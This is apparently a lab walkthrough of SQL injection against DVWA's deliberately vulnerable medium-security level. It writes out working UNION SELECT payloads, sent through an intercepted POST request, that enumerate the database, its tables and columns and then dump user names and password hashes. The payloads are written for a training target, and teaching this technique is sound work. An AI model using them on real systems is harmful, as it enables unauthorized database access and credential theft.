SQLinjection DVWA medium

The level of difficulty has increased a minimum, we can't just input special characters to break the SQL statement anymore.

User ID now is presetend as a dropdown menu with values of [1,2,3,4,5] and the query does not show in the URL

That's not a problem if you're acquainted with burpsuite.

Once we intercept the request we notice the POST request:

```
id=1&Submit=Submit
```
## Breaking the query

The first attempt is to close the id=1 with a single quote (') and inject something after.

```
id=1'&Submit=Submit
```

> You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'OR 1=1' at line 1.

There seems to be a backslash character injected to escape the singlequote...

```
id=1+union+select+null,database()+--+&Submit=Submit
```

> admin
> dvwa

Now, we know the database name *dvwa*.

```
id=1+union+select+null,table_name+from+information_schema.tables+--+&Submit=Submit
```

The devs make it painful to insert special characters such as the equal sign (=) because they inject backslashes, so we'll have to sort out the output..

> admin
> guestbook
> users

Now we have tables name *guestbook* and *users*


```
id=1+union+select+null,column_name+from+information_schema.columns+--+&Submit=Submit
```

The output is polluted as we can't use the WHERE clause, but we still see interresting output

> admin
> comment_id
> comment
> name
> user_id
> first_name
> last_name
> user
> password
> avatar
> ...

## Exploiting to dump password hashes

Now that we know the database name is dvwa, the users table contains columns such as *user* and *password* we can dump this info:

```
id=1+union+select+users.user,users.password+from+dvwa.users+--+&Submit=Submit
```

> First name: admin
> Last name: admin
> First name: admin
> Last name: md5passwordhash
> ...
